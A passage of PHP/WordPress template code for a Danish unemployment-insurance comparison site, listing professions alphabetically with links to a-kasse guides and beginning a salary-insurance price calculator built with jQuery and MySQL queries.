                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Er du under uddannelse som jursit eller er du ansat som en, så har et væld af muligheder, når det kommer til a-kasse. Her giver vi dig det fulde overblik.</p>
                  </div>
              </div>
                 <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-jord-og-betonarbejdere/" title="A-kasse for jord- og betonarbejdere">Jord- og betonarbejdere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">I denne artikel se vi på, hvilke muligheder for a-kasse for jord- og betonarbejdere der findes. Vi finder de billigste og bedste, så du kan spare penge!</p>
                  </div>
              </div>
            <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-jordemoedre/" title="A-kasse for jordemødre">Jordemødre</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi skal i denne guide kigge på mulighederne for a-kasse for jordemødre. Vi ser både på de oplagte muligheder samt alternativerne</p>
                  </div>
              </div>
              <div class="job">
                    <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-journalister/" title="A-kasse for journalister">Journalister</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                    <div class="job_desc" style="height: 0px;">
                    <p class="job_desc_text">Arbejder du som journalist, så findes der rigtig mange muligheder for en god og billig a-kasse. I denne artikel giver vi dig det komplette overblik</p>
                    </div>
                </div>
            </div>
       </div>
       <div style="display:flex;margin-bottom: 10px;">
           <div style="display:inline-block;width:250px;float:left;flex:1;">
                   <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>K</strong></p>
               <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-kokke/" title="A-kasse for Kokke">Kokke</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Er du kok, kokkeelev eller køkkenassistent, så er det en god idé, at være medlem af en a-kasse. Denne artikel kigger på mulighederne for a-kasse for kokke.</p>
                </div>
     	      </div>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-kunstnere/" title="A-kasse for Kunstner">Kunstnere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Er du skuespiller, kunstmaler, musiker, artist eller anden form for kunstner, så kan du her få hjælp til at finde den a-kasse, som passer til dig og dine behov.</p>
                </div>
     	      </div>
            </div>
            <div style="display:inline-block;width:250px;float:left;flex:1;">
               <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>L</strong></p>
               <div class="job">
                  <p style="margin-bottom:0px"><a href="/blog/a-kasse-for-laeger.php" title="A-kasse for Læger">Læger</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Som læge har du brug for en a-kasse. Vi har fundet en lang række a-kasser for læger, og giver dig her et komplet overblik over dine muligheder.</p>
                  </div>
              </div>
               <div class="job">
                  <p style="margin-bottom:0px"><a href="/blog/a-kasse-for-laerere.php" title="A-kasse for Lærere">Lærere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Er du lærer eller lærerstuderende, så kan du her finde en komplet oversigt over a-kasser for lærere. Vi giver du både, priser og tilfredshedsscores på en række a-kasser.</p>
                  </div>
              </div>
               <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-lagerarbejdere/" title="A-kasse for lagerarbejdere">Lagerarbejdere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Arbejder du som receptionist og leder du egen en god og billig a-kasse, så har vi her lavet et komplet overblik med alle dine muligheder.</p>
                  </div>
              </div>
               <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-laboranter/" title="A-kasse for Laboranter">Laboranter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">I denne artikel kigger vi på a-kasser for laboranter. Som laborant har du flere muligheder for a-kasse, men hvilken er lige den bedste?</p>
                  </div>
              </div>
               <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-landmaend-og-fiskere/" title="A-kasse for Landmænd">Landmænd</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Er du landmand eller fisker er der lidt forskellige muligheder for a-kasse. Det afhænger blandt andet af om du er selvstændig eller ansat på en gård.</p>
                  </div>
              </div>
               <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-lufthavnsmedarbejdere/" title="A-kasse for Lufthavnsmedarbejder">Lufthavnsmedarbejder</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi ser her på de muligheder du har, hvis du er ansat i en lufthavn, det kunne f.eks. være som bagagemedarbejder, checkin-medarbejder eller rengøring.</p>
                  </div>
              </div>
              <div class="job">
                 <p style="margin-bottom:0px"><a href="/blog/leder-og-a-kasse.php" title="A-kasse for ledere">Ledere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height: 0px;">
                 <p class="job_desc_text">Er du leder og kigger du efter en god a-kasse, som passer til dig og din professionelle karriere. Læs med her, hvor vi kigger på a-kasser for ledere</p>
                 </div>
             </div>
            </div>
       </div>
       <div style="display:flex;margin-bottom: 10px;">
           <div style="display:inline-block;width:250px;float:left;flex:1;">
                   <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>M</strong></p>
                                   <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-mekanikere/" title="A-kasse for Mekanikere">Mekanikere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne artikel kigger vi nærmere på a-kasse for montører. Vi kigger på de traditionelle valg samt hvilke alternativer der findes, hvor du kan spare penge</p>
                </div>
     	      </div>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-murere/" title="A-kasse for Murere">Murere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne guide kigger vi nærmere på a-kasser for murere. Vi kigger på dine muligheder, og hvor du kan spare penge ved at melde dig ind!</p>
                </div>
     	      </div>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-montoerer/" title="A-kasse for Montører">Montører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Arbejder du som receptionist og leder du egen en god og billig a-kasse, så har vi her lavet et komplet overblik med alle dine muligheder.</p>
                </div>
     	      </div>
			<div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-musikere/" title="A-kasse for musikere">Musikere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">I denne guide kigger vi på a-kasse for musikere, og hvilke du som musiker kan vælge. Vi kigger både på de oplagte og de billigste.</p>
                  </div>
              </div>
                <div class="job">
                  <pstyle="margin-bottom:0px"><a href="/wp/a-kasse-for-maskinmestre/" title="A-kasse for maskinmestre">Maskinmestre</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi skal i denne guide kigge på mulighederne for a-kasse, hvis du er maskinmester. Vi ser både på de billigste og bedste</p>
                  </div>
              </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-massoerer/" title="A-kasse for Massører">Massører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Her kan du se en oversigt over de bedste og billigste a-kasser for massører. Få hjælp til at vælge den rigtige a-kasse.</p>
                  </div>
              </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-salg-marketing/" title="A-kasse for marketing">Marketing</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Arbejder du med salg og marketing og leder du efter en a-kasse? Læs med her, og bliv klogere på, hvem du bør vælge</p>
                  </div>
              </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-magister/" title="A-kasse for marketing">Magister</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi kigger i denne guide på a-kasser for magister. Vi ser både på de billigste og mest oplagte valg for en magister uddannet.</p>
                  </div>
              </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-malere/" title="A-kasse for malere">Malere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi skal i denne guide kigge nærmere på a-kasse for malere. Vi skal på både de klassiske valg samt de billigste.</p>
                  </div>
              </div>
            </div>
            <div style="display:inline-block;width:250px;float:left;flex:1;">
                       <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>N</strong></p>
                     <div class="job">
                    <p style="margin-bottom:0px"><a href="/wp/a-kasse-nyuddannet/" title="A-kasse for nyuddannede">Nyuddannet</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                    <div class="job_desc" style="height: 0px;">
                    <p class="job_desc_text">Her får du et komplet overblik over dine muligheder for a-kasse som ny nyuddannet. Se hvilke a-kasser nyuddannede kan melde sig ind i.</p>
                    </div>
                    </div>
           </div>
       </div>
       <div style="display:flex;margin-bottom: 10px;">
         <div style="display:inline-block;width:250px;float:left;flex:1;">
                    <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>O</strong></p>
                  <div class="job">
                 <p style="margin-bottom:0px"><a href="/wp/a-kasser-offentligt-ansatte/" title="A-kasse for Offentligt ansatte">Offentligt ansatte</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height: 0px;">
                 <p class="job_desc_text">Arbejder du indenfor det offentlige, og leder du efter en a-kasse? Her giver vi dig de bedste og billigste a-kasser for offentligt ansatte</p>
                 </div>
                 </div>
                 <div class="job">
                 <p style="margin-bottom:0px"><a href="/wp/a-kasse-urmagere-og-optikere/" title="A-kasse for optiker">Optiker</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height: 0px;">
                 <p class="job_desc_text">I denne guide ser vi på a-kasse for urmagere og optikere. Vi skal se, hvor du finder den billigste a-kasse, hvis du arbejder som urmager eller optiker.</p>
                 </div>
               </div>
        </div>
          <div style="display:inline-block;width:250px;float:left;flex:1;">
             <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>P</strong></p>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/blog/a-kasse-for-paedagoger-paedagogmedhjaelpere.php" title="A-kasse for Pædagoger og pædagogmedhjælpere">Pædagoger og pædagogmedhjælpere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Er du pædagog, pædagogmedhjælper eller pædagogstuderende, så finder du her en pris oversigt over a-kasser for pædagog og pædagogmedhjælper.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-psykologer/" title="A-kasse for Psykologer">Psykologer</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Er du psykolog og har du brug for en god og billig a-kasse, så læs med her, hvor vi ser på de bedste og billigste a-kasser for psykologer.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-programmoerer/" title="A-kasse for Programmører">Programmører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne danske guide ser vi på a-kasser for programmører. Vi ser på hvilke a-kasser der er de bedste og billigste for programmører.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-politibetjente/" title="A-kasse for Politibetjente">Politibetjente</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne guide kigger vi på a-kasser for politibetjente. Vi ser på en række forskellige muligheder og finder de bedste og billigste.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-portoerer/" title="A-kasse for Portører">Portører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">A-kasse for portører | Her er de bedste og billigste muligheder</p>
                </div>
     	      </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-piloter/" title="A-kasse for piloter">Piloter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Vi skal i denne guide kigge på mulighederne for a-kasse for piloter. Vi kigger både på de billigste og bedste løsninger.</p>
                  </div>
              </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/a-kasse-procesoperatoerer/" title="A-kasse for procesoperatører">Procesoperatører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Du får i denne guide hjælp til atvælge de bedste og billigste a-kasser for procesoperatører. Læs med og bliv klogere!</p>
                  </div>
              </div>
              <div class="job">
                  <p style="margin-bottom:0px"><a href="/wp/produktion-a-kasse/" title="A-kasse for ansatte i produktion">Ansatte i produktion</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                  <div class="job_desc" style="height: 0px;">
                  <p class="job_desc_text">Arbejder du i produktionen og leder du efter en god a-kasse? Her giver vi de bedste og billigste a-kasser til dig der arbejder med produktion</p>
                  </div>
              </div>
          </div>
       </div>
       <div style="display:flex;margin-bottom: 10px;">
         <div style="display:inline-block;width:250px;float:left;flex:1;">
             <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>R</strong></p>
               <div class="job">
                 <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-revisorer/" title="A-kasse for Revisorer">Revisorer</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height: 0px;">
                 <p class="job_desc_text">Er du ansat som eller uddannet revisor, så er der mange muligheder for at blive medlem af en god og billig a-kasse. Her giver vi dig det fulde overblik!</p>
                 </div>
             </div>
               <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-rengoeringsassistenter/" title="A-kasse for Rengøringsassistenter">Rengøringsassistenter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height: 0px;">
                 <p class="job_desc_text">Vi skal i denne artikel se på a-kasser for rengøringsassistenter. Vi kigger på priser, kundetilfredshed og meget mere, så du kan finde den rette a-kasse.</p>
                 </div>
             </div>
               <div class="job">
                 <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-receptionister/" title="A-kasse for Receptionister">Receptionister</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height: 0px;">
                 <p class="job_desc_text">Arbejder du som receptionist og leder du egen en god og billig a-kasse, så har vi her lavet et komplet overblik med alle dine muligheder.</p>
                 </div>
               </div>
               <div class="job">
                 <p style="margin-bottom:0px"><a href="/wp/renovation-a-kasser/" title="A-kasse for ansatte i Renovation">Renovation</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height: 0px;">
                 <p class="job_desc_text">Arbejder du med renovation, f.eks. som skraldemand, så får du her hjælp til at finde de bedste og billigste a-kasser.</p>
                 </div>
               </div>
             </div>
          <div style="display:inline-block;width:250px;float:left;flex:1;">
             <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>S</strong></p>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/blog/a-kasse-for-socialraedgivere.php" title="A-kasse for Socialrådgivere">Socialrådgivere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Leder du efter a-kasse og er du socialrådgiver, så finder du her en oversigt over a-kasse for socialrådgivere. Vi har fundet priser på en række a-kasser så du kan vælge den billigste.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-souschef/" title="A-kasse for souschefer">Souschef</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne guide skal vi se nærmere på, hvilke a-kasser der findes til dig som arbejder som souschef. Vi ser på de billigste og bedste løsninger.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/blog/a-kasse-for-sygeplejesker.php" title="A-kasse for Sygeplejesker">Sygeplejesker</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Er du sygeplejeske, og leder du efter en god og billig a-kasse? Så kan du her finde et overblik over a-kasser for sygeplejesker og sygeplejestuderende</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-saelgere/" title="A-kasse for sælgere">Sælgere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denn guide kigger på a-kasse for sælgere. Vi ser på, hvilke a-kasse der er billigst og bedst, hvis du arbejder som sælger.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-struktoerer/" title="A-kasse for struktører">Struktører</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Vi skal i denne guide se på a-kasser for struktører og struktørelever. Se hvem der er billigst og hvor du sparer flest penge ved at melde dig ind lige nu.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-soldater/" title="A-kasse for Soldater">Soldater</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne artikel kigger vi nærmere på de muligheder der findes for soldater, når det kommer til a-kasse. Hvilke a-kasse kan man melde sig ind i som soldat?</p>
                </div>
     	      </div>
             <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-stewardesser/" title="A-kasse for Stewardesser">Stewardesser</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Som stewardesse findes der mange muligheder for en god a-kasse. I denne artikel kigger vi på de bedste og billigste a-kasser for stewardesser.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-smede/" title="A-kasse for Smede">Smede</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne artikel kigger vi på a-kasser for smede. Vi kigger på hvem det oplagte valg er samt hvilke alternativer der findes og hvor meget du kan spare.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-slagterimedarbejdere/" title="A-kasse for Slagterimedarbejdere">Slagterimedarbejdere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">I denne guide kigger vi a-kasser for slagterimedarbejdere. Vi finder de bedste og billigste muligheder, der dækker dig bedst, hvis du bliver ledig.</p>
                </div>
     	      </div>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-salg-marketing/" title="A-kasse salg">Salg</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Arbejder du med salg og marketing og leder du efter en a-kasse? Læs med her, og bliv klogere på, hvem du bør vælge</p>
                </div>
     	      </div>
            <div class="job">
              <p style="margin-bottom:0px"><a href="/blog/selvstaendig-og-a-kasse.php" title="A-kasse selvstændige">Selvstændige</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Er du selvstændig og har brug for en god A-kasse der tilgodeser dig som selvstændig og de behov du har? Så læs med her og find en a-kasse for selvstændige</p>
              </div>
           </div>
           <div class="job">
             <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-sosu/" title="A-kasse for SOSU">SOSU</a> <span class="glyphicon glyphicon-info-sign"></span></p>
             <div class="job_desc" style="height: 0px;">
             <p class="job_desc_text">Arbejder du som SOSU-assistent eller SOSU-hjælper, og leder du efter en god a-kasse? Læs med her, hvor vi ser på a-kasser for SOSU</p>
             </div>
          </div>
          </div>
       </div>
       <div style="display:flex;margin-bottom: 10px;">
         <div style="display:inline-block;width:250px;float:left;flex:1;">
          <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>T</strong></p>
           <div class="job">
           <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-terapeuter/" title="A-kasse for Terapeuter">Terapeuter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                   <div class="job_desc" style="height: 0px;">
                   <p class="job_desc_text">Er du ergoterapeut, fysioterapeut, psykoterapeut eller en anden form for terapeut og har du brug for en a-kasse? Så læs med her, hvor vi ser på mulighederne</p>
                   </div>
       </div>
           <div class="job">
           <p style="margin-bottom:0px"><a href="/blog/a-kasse-for-toemrer-frisoere.php" title="A-kasse for Tømrere">Tømrere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                   <div class="job_desc" style="height: 0px;">
                   <p class="job_desc_text">Er du frisør eller tømrer har du brug for en a-kasse lige som alle andre. Se her hvem du kan og bør vælge blandt a-kasser for tømrere og frisører!</p>
                   </div>
       </div>
        <div class="job">
           <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-tjenere/" title="A-kasse for Tjenere">Tjenere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
           <div class="job_desc" style="height: 0px;">
           <p class="job_desc_text">Som tjener er det altid en god idé at være medlem af en a-kasse. I denne artikel kigger vi på a-kasser for tjenere, og giver dig det fulde overblik.</p>
           </div>
        </div>
        <div class="job">
                 <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-tandlaeger-og-tandteknikere/" title="A-kasse for Tandlæger og Tandteknikere">Tandlæger og Tandteknikere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                 <div class="job_desc" style="height: 0px;">
                 <p class="job_desc_text">Vi skal i denne guide kigge på a-kasse for Tandlæger og Tandteknikere. Vi ser både på de billigste og bedste valg.</p>
                 </div>
           </div>
   </div>
                  <div style="display:inline-block;width:250px;float:left;flex:1;">
                   <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>U</strong></p>
                  <div class="job">
                    <p style="margin-bottom:0px"><a href="/wp/a-kasse-og-fagforening-for-udlaendinge/" title="A-kasse for Udlændinge">Udlænding</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                            <div class="job_desc" style="height: 0px;">
                            <p class="job_desc_text">I denne artikel kigger vi på a-kasse og fagforening for udlændinge, da der er visse regler og muligheder, som du som udlænding skal være opmærksom på.</p>
                            </div>
     	          </div>
                  <div class="job">
                    <p style="margin-bottom:0px"><a href="/wp/a-kasse-urmagere-og-optikere/" title="A-kasse for urmagere">Urmagere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                            <div class="job_desc" style="height: 0px;">
                            <p class="job_desc_text">I denne guide ser vi på a-kasse for urmagere og optikere. Vi skal se, hvor du finder den billigste a-kasse, hvis du arbejder som urmager eller optiker.</p>
                            </div>
     	          </div>
                  <div class="job">
                                       <p style="margin-bottom:0px"><a href="/wp/a-kasse-og-fagforening-for-unge/" title="A-kasse for Unge">Ung</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                            <div class="job_desc" style="height: 0px;">
                            <p class="job_desc_text">Man skal allerede som ung overveje, hvilken a-kasse man skal melde sig ind i. I denne artikel kigger vi derfor på a-kasser og fagforeninger for unge.</p>
                            </div>
     	          </div>
                    <div class="job">
                    <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-ufaglaerte/" title="A-kasse for Ufaglærte">Ufaglært</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                            <div class="job_desc" style="height: 0px;">
                            <p class="job_desc_text">Vi skal i denne artikel se på, hvilke muligheder der findes for a-kasser og fagforening for ufaglærte. Vi kigger på priser og meget andet.</p>
                            </div>
     	          </div>
            </div>
          </div>
      <div style="display:flex;margin-bottom: 10px;">
        <div style="display:inline-block;width:250px;float:left;flex:1;">
              <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>V</strong></p>
              <div class="job">
                <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-vagter/" title="A-kasse for Vagter">Vagter</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                <div class="job_desc" style="height: 0px;">
                <p class="job_desc_text">Er du sikkerhedsvagt, parkeringsvagt eller fængselsvagt, så er det vigtigt, at du er medlem af en a-kasse. Vi giver dig her et overblik over mulighederne!</p>
                </div>
              </div>
            <div class="job">
              <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-vikarer/" title="A-kasse for vikarer">Vikarer</a> <span class="glyphicon glyphicon-info-sign"></span></p>
              <div class="job_desc" style="height: 0px;">
              <p class="job_desc_text">Vi skal i denne guide se på, hvilke muligheder for a-kasse der findes, når man arbejder som vikar, f.eks. lærere-vikar.</p>
              </div>
          </div>
           </div>
           <div style="display:inline-block;width:250px;float:left;flex:1;">
                   <p style="margin-bottom:5px;border-bottom:1px solid #ddd;max-width:80%"><strong>W</strong></p>
                   <div class="job">
                    <p style="margin-bottom:0px"><a href="/wp/a-kasse-for-webdesignere/" title="A-kasse for Webdesignere">Webdesignere</a> <span class="glyphicon glyphicon-info-sign"></span></p>
                            <div class="job_desc" style="height: 0px;">
                            <p class="job_desc_text">Vi kigger i denne danske vejledning på a-kasser for webdesignere. Vi giver dig et komplet overblik, så du kan vælge den billigste løsning på markedet.</p></div>
     			  </div>
           </div>
       </div>
 </div>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'akasse_jobs', 'akasse_jobs' );
}


 function loensikring($db) {
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
	  $(document).ajaxComplete(function(){
		 $('[data-toggle="tooltip"]').tooltip();
	  })
</script>
<script>
  function getsalerytable(salery) {
                  $.ajax({
                    type: "GET",
                    dataType: "html",
                    url: "https://www.find-a-kasse-priser.dk/fuld-tabel.php?salery=" + salery,
                    cache: false,
                    success: function(htmldata) {
						$('#loensikring').html(htmldata);
                    }
                  });
                }
$(document).ready(function() {
	$("#beregn").click(function() {
		getsalerytable($("#salery" ).val());
$('#loader-area').html('<div class="getting-data" id="getting-data"><strong>Henter data...</strong><br/><div class="loader"></div></div>');
		setTimeout(function() {
			$('#getting-data').fadeOut('slow');
			$('#note-salery').html($("#salery" ).find(':selected').text());
		}, 1000); // <-- time in milliseconds
       $('html, body').animate({
       		scrollTop: jQuery("#loader-area").offset().top -200
       }, 1000);
	});
})
jQuery(document).ready(function($){
		$('#full_table').click(function(){
		$('.loensikring-table').css("height","100%");
		$('#full_table').hide();
		});
});
$(document).ajaxComplete(function(){
	$('#full_table').click(function(){
	$('.loensikring-table').css("height","100%");
	$('#full_table').hide();
	});
})
</script>
    <div class="full-search-container">
          <div class="container container-content">
                <div class="row">
                    <div class="col-sm-12">
                        <div class="full-search-container-h2-contain">
                        <h1>Lønsikring<br> <small style="color:#000">Vælg din løn og indhent priser hos <?php echo $udbyder_count; ?> danske a-kasser</small></h1>
                        <span style="font-size:16px;margin-top:-23px;display:block;">Vi er reklamefinansieret. Denne side indeholder derfor annoncør-links</span>
                        </div>
<div class="salery-calculator">
    <div class="col-md-12">
    <form id="saleryform">
    <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;font-size:16px;" data-toggle="tooltip" data-container="body" title="Vælg det lønniveau før skat, som matcher din nuværende løn bedst." ></span> Vælg din løn:
    <select name="salery" id="salery" >
    <?php
    global $db;
    $get_salery = "SELECT DISTINCT(salery) FROM loensikring_priser ORDER BY salery ASC";
    $result_salery = $db->query($get_salery );
    while ($row_name = mysqli_fetch_array($result_salery)) {
          $salery = $row_name["salery"];
		  $salery_decimal = number_format($row_name["salery"], 0, ',', '.');
		  ?>
         <option value="<?php echo $salery; ?>" <?php if ($salery==31000){ echo 'selected';} ?>><?php echo $salery_decimal; ?></option>
         <?php
    }
    ?>
    </select>
    </form>
     <span id="beregn">BEREGN</span>
     <span class="beregn-note">Vælg en løn der matcher din, og indhent priser på lønsikring der passer til dig herunder.<br/>Priserne er beregnet på baggrund af en løn på <span id="note-salery">31.000</span> DKK før skat med en udbetalingsperiode på 12 mdr.</span>
     </div>
 </div>
 </div>
</div>
</div>
</div>
<div class="container container-content" style="margin-top:30px;">
        <div class="row">
            <div class="col-sm-12">
 <?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM loensikring_udbyder ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
 <div class="col-md-12 hidden-sm hidden-xs">
